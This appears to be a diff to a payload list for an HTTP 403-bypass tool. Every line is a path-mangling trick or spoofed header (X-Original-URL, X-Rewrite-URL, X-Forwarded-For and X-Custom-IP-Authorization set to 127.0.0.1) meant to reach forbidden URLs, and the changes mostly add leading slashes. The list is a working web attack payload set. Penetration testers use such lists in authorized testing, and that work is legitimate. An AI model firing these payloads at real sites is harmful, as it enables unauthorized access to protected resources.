@@ -13,11 +13,11 @@ $1/%2e/$2
 $1/$2/.
 $1//$2//
 $1/./$2/./
-$1/$2anything -H "X-Original-URL: $2"
+$1/$2anything -H "X-Original-URL: /$2"
 $1 -H "X-Original-URL: $1" 
 $1/$2 -H "X-Custom-IP-Authorization: 127.0.0.1"
 $1 -H "X-Rewrite-URL: $1"
-$1 -H "X-Rewrite-URL: $2"
+$1 -H "X-Rewrite-URL: /$2"
 $1/$2 -H "Referer: /$2"
 $1/$2 -H "X-Originating-IP: 127.0.0.1"
 $1/$2 -H "X-Forwarded-For: 127.0.0.1"
@@ -34,7 +34,7 @@ $1/$2?
 $1/$2???
 $1/$2//
 $1/$2/
-$1/$2/.random
+$1/$2/.randomstring
 $1/$2.json
 $1/$2%23
 $1/$2%26
